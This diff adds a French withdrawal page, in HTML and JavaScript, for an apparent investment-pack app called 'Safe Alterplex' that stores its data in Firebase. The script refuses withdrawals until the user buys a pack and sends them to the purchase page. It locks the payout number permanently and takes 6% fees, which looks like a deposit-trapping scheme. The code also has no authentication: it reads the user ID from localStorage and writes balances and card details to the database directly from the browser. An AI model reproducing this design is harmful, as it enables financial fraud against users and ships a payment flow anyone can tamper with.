@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safe Alterplex - Demande de Retrait</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            color: #000;
+            padding-bottom: 90px;
+        }
+
+        /* En-tête */
+        .top-header {
+            background-color: #000;
+            color: #fff;
+            padding: 20px 15px;
+            text-align: center;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 15px;
+            top: 22px;
+            color: #fff;
+            text-decoration: none;
+            font-size: 18px;
+        }
+
+        .brand-title {
+            font-size: 16px;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .container {
+            padding: 15px;
+        }
+
+        /* Card Solde */
+        .balance-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .balance-label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 600;
+        }
+
+        .balance-val {
+            font-size: 18px;
+            font-weight: 900;
+            color: #000;
+        }
+
+        /* Message d'avertissement si pas d'investissement */
+        .investment-warning {
+            background: #feefc3;
+            border: 1px solid #f2994a;
+            color: #8a5300;
+            border-radius: 12px;
+            padding: 12px 15px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Section Liaison de carte / Compte de paiement */
+        .card-section {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
+
+        .section-title {
+            font-size: 13px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-label {
+            font-size: 11px;
+            color: #555;
+            font-weight: 700;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            background: #fff;
+        }
+
+        .form-input:focus {
+            border-color: #000;
+        }
+
+        .form-input[readonly] {
+            background: #f0f0f0;
+            color: #555;
+            cursor: not-allowed;
+        }
+
+        .locked-notice {
+            font-size: 11px;
+            color: #137333;
+            background: #e6f4ea;
+            padding: 8px;
+            border-radius: 6px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-save-card {
+            width: 100%;
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 800;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        /* Formulaire de Retrait */
+        .withdraw-section {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 14px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
+
+        .fee-info {
+            background: #f8f9fa;
+            border: 1px dashed #ccc;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 12px 0;
+            font-size: 12px;
+        }
+
+        .fee-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .fee-row:last-child {
+            margin-bottom: 0;
+            font-weight: 800;
+            border-top: 1px solid #ddd;
+            padding-top: 4px;
+        }
+
+        .btn-withdraw {
+            width: 100%;
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+
+        .btn-withdraw:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Bloc Notice Règles de Retrait */
+        .notice-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 14px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .notice-title {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .notice-list {
+            list-style: none;
+            font-size: 12px;
+            color: #444;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .notice-list li {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .notice-list i {
+            color: #000;
+            margin-top: 2px;
+        }
+
+        /* Navigation inférieure */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #fff;
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0;
+            border-top: 1px solid #e0e0e0;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.03);
+        }
+
+        .nav-item {
+            text-decoration: none;
+            color: #888;
+            text-align: center;
+            font-size: 10px;
+            font-weight: 500;
+        }
+
+        .nav-item.active {
+            color: #000;
+            font-weight: 800;
+        }
+
+        .nav-icon {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 3px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- En-tête -->
+    <div class="top-header">
+        <a href="profil.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
+        <div class="brand-title">Demande de Retrait</div>
+    </div>
+
+    <div class="container">
+
+        <!-- Carte Solde -->
+        <div class="balance-card">
+            <span class="balance-label">Solde disponible :</span>
+            <span class="balance-val" id="userBalanceDisplay">0 FC</span>
+        </div>
+
+        <!-- Avertissement si aucun investissement -->
+        <div id="noInvestmentWarning" class="investment-warning" style="display: none;">
+            <i class="fas fa-triangle-exclamation" style="font-size: 18px;"></i>
+            <span>Vous devez effectuer au moins un investissement (achat de pack) avant de pouvoir retirer vos fonds.</span>
+        </div>
+
+        <!-- Étape 1 : Liaison de la carte / Compte de réception (Une fois pour toutes) -->
+        <div class="card-section">
+            <div class="section-title">
+                <i class="fas fa-credit-card"></i> Compte de Réception (Carte / Mobile)
+            </div>
+
+            <div id="cardBindingForm">
+                <div class="form-group">
+                    <label class="form-label">Nom complet (Enregistré sur la SIM / Carte)</label>
+                    <input type="text" id="cardHolderName" class="form-input" placeholder="Ex: Jean Dupont">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Numéro de réception</label>
+                    <input type="tel" id="cardNumber" class="form-input" placeholder="Ex: 0890000000">
+                </div>
+                <button class="btn-save-card" onclick="bindPaymentCard()">
+                    <i class="fas fa-lock"></i> Lier la carte définitivement
+                </button>
+            </div>
+
+            <div id="cardLockedNotice" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label">Nom du titulaire :</label>
+                    <input type="text" id="lockedName" class="form-input" readonly>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Numéro lié :</label>
+                    <input type="text" id="lockedNumber" class="form-input" readonly>
+                </div>
+                <div class="locked-notice">
+                    <i class="fas fa-circle-check"></i> Carte/Compte lié de manière définitive.
+                </div>
+            </div>
+        </div>
+
+        <!-- Étape 2 : Formulaire de demande de retrait -->
+        <div class="withdraw-section">
+            <div class="section-title">
+                <i class="fas fa-money-bill-transfer"></i> Effectuer un retrait
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Montant du retrait (Min: 6 000 FC)</label>
+                <input type="number" id="withdrawAmount" class="form-input" placeholder="Saisir le montant..." oninput="calculateFees()">
+            </div>
+
+            <div class="fee-info">
+                <div class="fee-row">
+                    <span>Frais de retrait (6%) :</span>
+                    <span id="feeAmount">0 FC</span>
+                </div>
+                <div class="fee-row">
+                    <span>Montant net à recevoir :</span>
+                    <span id="netAmount">0 FC</span>
+                </div>
+            </div>
+
+            <button class="btn-withdraw" id="submitWithdrawBtn" onclick="processWithdrawal()">
+                Soumettre le retrait
+            </button>
+        </div>
+
+        <!-- Notice explicative -->
+        <div class="notice-card">
+            <div class="notice-title">
+                <i class="fas fa-circle-info"></i> Conditions & Règles de Retrait
+            </div>
+            <ul class="notice-list">
+                <li>
+                    <i class="fas fa-shield-halved"></i>
+                    <span>Retrait réservé aux utilisateurs ayant effectué <strong>au moins un investissement activement</strong>.</span>
+                </li>
+                <li>
+                    <i class="fas fa-clock"></i>
+                    <span>Les retraits s'effectuent <strong>chaque jour, 24 heures sur 24</strong>.</span>
+                </li>
+                <li>
+                    <i class="fas fa-bolt"></i>
+                    <span>Le délai direct de traitement est de <strong>10 minutes</strong>.</span>
+                </li>
+                <li>
+                    <i class="fas fa-percent"></i>
+                    <span>Les frais de traitement réseau sont fixés à <strong>6%</strong>.</span>
+                </li>
+                <li>
+                    <i class="fas fa-hand-holding-dollar"></i>
+                    <span>Le montant minimum par transaction est de <strong>6 000 FC</strong>.</span>
+                </li>
+            </ul>
+        </div>
+
+    </div>
+
+    <!-- Navigation du Bas -->
+    <nav class="bottom-nav">
+        <a href="dashboard.html" class="nav-item">
+            <i class="fas fa-house nav-icon"></i>Accueil
+        </a>
+        <a href="produit.html" class="nav-item">
+            <i class="fas fa-bolt nav-icon"></i>Énergie
+        </a>
+        <a href="equipe.html" class="nav-item">
+            <i class="fas fa-user-group nav-icon"></i>Équipe
+        </a>
+        <a href="profil.html" class="nav-item active">
+            <i class="fas fa-user nav-icon"></i>Moi
+        </a>
+    </nav>
+
+    <script>
+        const dbUrl = "https://canal-e4274-default-rtdb.firebaseio.com";
+        const userPhone = localStorage.getItem('userPhone') || '890000000';
+        
+        let currentBalance = 0;
+        let isCardBound = false;
+        let hasInvested = false;
+
+        // Charger le profil, les investissements et la carte liée
+        async function loadWithdrawData() {
+            try {
+                // 1. Récupération du profil
+                const res = await fetch(`${dbUrl}/users/${userPhone}.json`);
+                const userData = await res.json();
+
+                if (userData) {
+                    currentBalance = userData.balance || 0;
+                    document.getElementById('userBalanceDisplay').innerText = currentBalance.toLocaleString('fr-FR') + " FC";
+
+                    if (userData.paymentCard && userData.paymentCard.isBound) {
+                        isCardBound = true;
+                        showBoundCard(userData.paymentCard.holderName, userData.paymentCard.cardNumber);
+                    }
+                }
+
+                // 2. Vérification si l'utilisateur a déjà investi
+                const invRes = await fetch(`${dbUrl}/investments/${userPhone}.json`);
+                const invData = await invRes.json();
+
+                if (invData && Object.keys(invData).length > 0) {
+                    hasInvested = true;
+                } else {
+                    hasInvested = false;
+                    document.getElementById('noInvestmentWarning').style.display = 'flex';
+                }
+
+            } catch (err) {
+                console.error("Erreur au chargement :", err);
+            }
+        }
+
+        // Affichage du composant carte verrouillée
+        function showBoundCard(name, number) {
+            document.getElementById('cardBindingForm').style.display = 'none';
+            document.getElementById('cardLockedNotice').style.display = 'block';
+            document.getElementById('lockedName').value = name;
+            document.getElementById('lockedNumber').value = number;
+        }
+
+        // Lier définitivement la carte (Une fois pour toutes)
+        async function bindPaymentCard() {
+            const name = document.getElementById('cardHolderName').value.trim();
+            const number = document.getElementById('cardNumber').value.trim();
+
+            if (!name || !number) {
+                alert("Veuillez remplir correctement le nom et le numéro de téléphone.");
+                return;
+            }
+
+            if (!confirm("Attention : Ces coordonnées bancaires/mobile seront liées une fois pour toutes à votre compte et ne pourront plus être modifiées. Confirmer ?")) {
+                return;
+            }
+
+            const cardData = {
+                holderName: name,
+                cardNumber: number,
+                isBound: true,
+                boundAt: new Date().toISOString()
+            };
+
+            try {
+                await fetch(`${dbUrl}/users/${userPhone}/paymentCard.json`, {
+                    method: 'PUT',
+                    body: JSON.stringify(cardData)
+                });
+
+                isCardBound = true;
+                showBoundCard(name, number);
+                alert("Votre carte/compte de réception a été lié avec succès !");
+
+            } catch (err) {
+                console.error("Erreur lors de la liaison de la carte :", err);
+                alert("Erreur réseau. Veuillez réessayer.");
+            }
+        }
+
+        // Calcul dynamique des frais de 6%
+        function calculateFees() {
+            const amountInput = parseFloat(document.getElementById('withdrawAmount').value) || 0;
+            
+            if (amountInput > 0) {
+                const fee = Math.round(amountInput * 0.06);
+                const net = amountInput - fee;
+
+                document.getElementById('feeAmount').innerText = fee.toLocaleString('fr-FR') + " FC";
+                document.getElementById('netAmount').innerText = (net > 0 ? net : 0).toLocaleString('fr-FR') + " FC";
+            } else {
+                document.getElementById('feeAmount').innerText = "0 FC";
+                document.getElementById('netAmount').innerText = "0 FC";
+            }
+        }
+
+        // Soumettre la demande de retrait
+        async function processWithdrawal() {
+            // Blocage 1 : Si l'utilisateur n'a jamais investi
+            if (!hasInvested) {
+                alert("Retrait impossible : Vous n'avez effectué aucun investissement sur la plateforme. Veuillez acheter au moins un équipement/pack avant de demander un retrait.");
+                window.location.href = "produit.html";
+                return;
+            }
+
+            // Blocage 2 : Si la carte n'est pas liée
+            if (!isCardBound) {
+                alert("Vous devez obligatoirement lier votre carte/compte de réception avant de faire un retrait.");
+                return;
+            }
+
+            const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
+
+            if (amount < 6000) {
+                alert("Le montant minimum de retrait est de 6 000 FC.");
+                return;
+            }
+
+            if (amount > currentBalance) {
+                alert("Solde insuffisant pour effectuer ce retrait.");
+                return;
+            }
+
+            const btn = document.getElementById('submitWithdrawBtn');
+            btn.disabled = true;
+            btn.innerText = "Traitement en cours...";
+
+            try {
+                // 1. Déduire le solde
+                const newBalance = currentBalance - amount;
+                await fetch(`${dbUrl}/users/${userPhone}/balance.json`, {
+                    method: 'PUT',
+                    body: JSON.stringify(newBalance)
+                });
+
+                // 2. Enregistrer la demande dans Firebase
+                const withdrawRecord = {
+                    amount: amount,
+                    fee: Math.round(amount * 0.06),
+                    netAmount: Math.round(amount * 0.94),
+                    status: "En attente",
+                    createdAt: new Date().toISOString()
+                };
+
+                await fetch(`${dbUrl}/withdrawals/${userPhone}.json`, {
+                    method: 'POST',
+                    body: JSON.stringify(withdrawRecord)
+                });
+
+                alert("Votre demande de retrait de " + amount.toLocaleString('fr-FR') + " FC a été envoyée. Le délai moyen de traitement direct est de 10 minutes.");
+                window.location.href = "profil.html";
+
+            } catch (err) {
+                console.error("Erreur lors du retrait :", err);
+                alert("Une erreur s'est produite lors du traitement.");
+                btn.disabled = false;
+                btn.innerText = "Soumettre le retrait";
+            }
+        }
+
+        window.onload = loadWithdrawData;
+    </script>
+</body>
+</html>
